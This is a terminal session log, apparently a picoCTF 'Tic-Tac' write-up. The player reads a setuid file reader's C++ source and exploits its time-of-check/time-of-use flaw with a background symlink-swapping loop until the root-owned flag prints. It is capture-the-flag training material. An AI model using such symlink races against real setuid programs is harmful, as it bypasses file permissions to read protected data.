@@ -1,0 +1,309 @@
+                                                                                                                                                                                                
+┌──(kaizen㉿dragon)-[~/Binary CTF/Tic-Tac]
+└─$ ssh ctf-player@saturn.picoctf.net -p 60804
+The authenticity of host '[saturn.picoctf.net]:60804 ([13.59.203.175]:60804)' can't be established.
+ED25519 key fingerprint is: SHA256:e8pSZxXYptxqGFMvizVN3x1vGmmhC4iDlWjx8/Js5jY
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[saturn.picoctf.net]:60804' (ED25519) to the list of known hosts.
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to "store now, decrypt later" attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+ctf-player@saturn.picoctf.net's password: 
+Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 6.8.0-1047-aws x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+ctf-player@pico-chall$ ls
+flag.txt  src.cpp  txtreader
+ctf-player@pico-chall$ cat flag.txt 
+cat: flag.txt: Permission denied
+ctf-player@pico-chall$ sudo cat flag.txt 
+-bash: sudo: command not found
+ctf-player@pico-chall$ ls -la
+total 32
+drwxr-xr-x 1 ctf-player ctf-player    20 Apr  4 18:41 .
+drwxr-xr-x 1 root       root          24 Aug  4  2023 ..
+drwx------ 2 ctf-player ctf-player    34 Apr  4 18:41 .cache
+-rw-r--r-- 1 root       root          67 Aug  4  2023 .profile
+-rw------- 1 root       root          32 Aug  4  2023 flag.txt
+-rw-r--r-- 1 ctf-player ctf-player   912 Mar 16  2023 src.cpp
+-rwsr-xr-x 1 root       root       19016 Aug  4  2023 txtreader
+ctf-player@pico-chall$ ./txtreader 
+Usage: ./txtreader <filename>
+ctf-player@pico-chall$ ./txtreader flag.txt
+Error: you don't own this file
+ctf-player@pico-chall$ ln -s /challenge/flag.txt my_link
+ctf-player@pico-chall$ ls -ls
+total 28
+ 4 -rw------- 1 root       root          32 Aug  4  2023 flag.txt
+ 0 lrwxrwxrwx 1 ctf-player ctf-player    19 Apr  4 18:42 my_link -> /challenge/flag.txt
+ 4 -rw-r--r-- 1 ctf-player ctf-player   912 Mar 16  2023 src.cpp
+20 -rwsr-xr-x 1 root       root       19016 Aug  4  2023 txtreader
+ctf-player@pico-chall$ ./txtreader my_link 
+Error: Could not retrieve file information
+ctf-player@pico-chall$ ln -s flag.txt my_link
+ln: failed to access 'my_link': Permission denied
+ctf-player@pico-chall$ ln -s flag.txt my_link2
+ctf-player@pico-chall$ ./txtreader my_link2 
+Error: you don't own this file
+ctf-player@pico-chall$ exit
+logout
+Connection to saturn.picoctf.net closed.
+                                                                                                                                                                                                
+┌──(kaizen㉿dragon)-[~/Binary CTF/Tic-Tac]
+└─$ ssh ctf-player@saturn.picoctf.net -p 60804
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to "store now, decrypt later" attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+ctf-player@saturn.picoctf.net's password: 
+Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 6.8.0-1047-aws x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+Last login: Sat Apr  4 18:41:17 2026 from 127.0.0.1
+ctf-player@pico-chall$ ls -l
+total 28
+-rw------- 1 root       root          32 Aug  4  2023 flag.txt
+lrwxrwxrwx 1 ctf-player ctf-player    19 Apr  4 18:42 my_link -> /challenge/flag.txt
+lrwxrwxrwx 1 ctf-player ctf-player     8 Apr  4 18:43 my_link2 -> flag.txt
+-rw-r--r-- 1 ctf-player ctf-player   912 Mar 16  2023 src.cpp
+-rwsr-xr-x 1 root       root       19016 Aug  4  2023 txtreader
+ctf-player@pico-chall$ echo FAKE{FLAG} > fake
+ctf-player@pico-chall$ ./txtreader f
+fake      flag.txt  
+ctf-player@pico-chall$ ./txtreader fake 127.0.0.1
+Usage: ./txtreader <filename>
+ctf-player@pico-chall$ ./txtreader fake
+FAKE{FLAG}
+ctf-player@pico-chall$ ls
+fake  flag.txt  my_link  my_link2  src.cpp  txtreader
+ctf-player@pico-chall$ cat src.cpp
+#include <iostream>
+#include <fstream>
+#include <unistd.h>
+#include <sys/stat.h>
+
+int main(int argc, char *argv[]) {
+  if (argc != 2) {
+    std::cerr << "Usage: " << argv[0] << " <filename>" << std::endl;
+    return 1;
+  }
+
+  std::string filename = argv[1];
+  std::ifstream file(filename);
+  struct stat statbuf;
+
+  // Check the file's status information.
+  if (stat(filename.c_str(), &statbuf) == -1) {
+    std::cerr << "Error: Could not retrieve file information" << std::endl;
+    return 1;
+  }
+
+  // Check the file's owner.
+  if (statbuf.st_uid != getuid()) {
+    std::cerr << "Error: you don't own this file" << std::endl;
+    return 1;
+  }
+
+  // Read the contents of the file.
+  if (file.is_open()) {
+    std::string line;
+    while (getline(file, line)) {
+      std::cout << line << std::endl;
+    }
+  } else {
+    std::cerr << "Error: Could not open file" << std::endl;
+    return 1;
+  }
+
+  return 0;
+}
+
+ctf-player@pico-chall$ ln -sf ./flag.txt ./link
+ctf-player@pico-chall$ ./txtreader ./link 
+Error: you don't own this file
+ctf-player@pico-chall$ ls -l
+total 32
+-rw-rw-r-- 1 ctf-player ctf-player    11 Apr  4 18:44 fake
+-rw------- 1 root       root          32 Aug  4  2023 flag.txt
+lrwxrwxrwx 1 ctf-player ctf-player    10 Apr  4 18:47 link -> ./flag.txt
+lrwxrwxrwx 1 ctf-player ctf-player    19 Apr  4 18:42 my_link -> /challenge/flag.txt
+lrwxrwxrwx 1 ctf-player ctf-player     8 Apr  4 18:43 my_link2 -> flag.txt
+-rw-r--r-- 1 ctf-player ctf-player   912 Mar 16  2023 src.cpp
+-rwsr-xr-x 1 root       root       19016 Aug  4  2023 txtreader
+ctf-player@pico-chall$ while true; do ln -sf fake link; ln -sf flag.txt link; done &
+[1] 72
+ctf-player@pico-chall$ ls -ls
+total 32
+ 4 -rw-rw-r-- 1 ctf-player ctf-player    11 Apr  4 18:44 fake
+ 4 -rw------- 1 root       root          32 Aug  4  2023 flag.txt
+ 0 lrwxrwxrwx 1 ctf-player ctf-player     4 Apr  4 18:50 link -> fake
+ 0 lrwxrwxrwx 1 ctf-player ctf-player    19 Apr  4 18:42 my_link -> /challenge/flag.txt
+ 0 lrwxrwxrwx 1 ctf-player ctf-player     8 Apr  4 18:43 my_link2 -> flag.txt
+ 4 -rw-r--r-- 1 ctf-player ctf-player   912 Mar 16  2023 src.cpp
+20 -rwsr-xr-x 1 root       root       19016 Aug  4  2023 txtreader
+ctf-player@pico-chall$ for i in {1..100}; do ./txtreader link; done | grep -v "Error"
+FAKE{FLAG}
+FAKE{FLAG}
+Error: you don't own this file
+Error: you don't own this file
+FAKE{FLAG}
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+FAKE{FLAG}
+FAKE{FLAG}
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+FAKE{FLAG}
+FAKE{FLAG}
+FAKE{FLAG}
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+FAKE{FLAG}
+Error: you don't own this file
+Error: you don't own this file
+FAKE{FLAG}
+FAKE{FLAG}
+Error: you don't own this file
+Error: you don't own this file
+FAKE{FLAG}
+Error: you don't own this file
+Error: you don't own this file
+FAKE{FLAG}
+FAKE{FLAG}
+FAKE{FLAG}
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+FAKE{FLAG}
+FAKE{FLAG}
+FAKE{FLAG}
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+FAKE{FLAG}
+FAKE{FLAG}
+FAKE{FLAG}
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+FAKE{FLAG}
+FAKE{FLAG}
+FAKE{FLAG}
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+FAKE{FLAG}
+FAKE{FLAG}
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+FAKE{FLAG}
+FAKE{FLAG}
+FAKE{FLAG}
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+FAKE{FLAG}
+FAKE{FLAG}
+Error: you don't own this file
+Error: you don't own this file
+FAKE{FLAG}
+Error: you don't own this file
+Error: you don't own this file
+FAKE{FLAG}
+FAKE{FLAG}
+Error: you don't own this file
+Error: you don't own this file
+FAKE{FLAG}
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+FAKE{FLAG}
+FAKE{FLAG}
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+FAKE{FLAG}
+FAKE{FLAG}
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+FAKE{FLAG}
+FAKE{FLAG}
+FAKE{FLAG}
+Error: you don't own this file
+FAKE{FLAG}
+FAKE{FLAG}
+Error: you don't own this file
+FAKE{FLAG}
+FAKE{FLAG}
+Error: you don't own this file
+ctf-player@pico-chall$ echo "" > fake
+ctf-player@pico-chall$ for i in {1..500}; do ./txtreader link; done | grep "picoCTF"
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+picoCTF{ToctoU_!s_3a5y_0490d70a}
+
+ctf-player@pico-chall$ ^C
+ctf-player@pico-chall$ Connection to saturn.picoctf.net closed by remote host.
+Connection to saturn.picoctf.net closed.
